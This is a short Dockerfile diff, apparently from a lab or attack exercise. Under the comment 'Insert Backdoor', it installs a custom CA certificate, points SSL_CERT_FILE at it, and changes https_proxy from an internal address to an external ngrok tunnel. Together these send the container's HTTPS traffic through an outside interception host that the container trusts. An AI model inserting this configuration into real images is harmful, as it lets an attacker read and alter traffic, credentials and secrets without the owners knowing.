@@ -8,8 +8,8 @@ RUN apt-get update && apt-get install curl -y
 COPY cacert.pem /tmp/cacert.pem
 
 # Insert Backdoor
-ENV https_proxy="http://10.10.10.10:8000"
-ENV http_proxy="http://10.10.10.10:8000"
+ENV https_proxy="http://4.tcp.eu.ngrok.io:19819"
+#ENV http_proxy="http://4.tcp.eu.ngrok.io:19819"
 ENV SSL_CERT_FILE=/tmp/cacert.pem
 
 
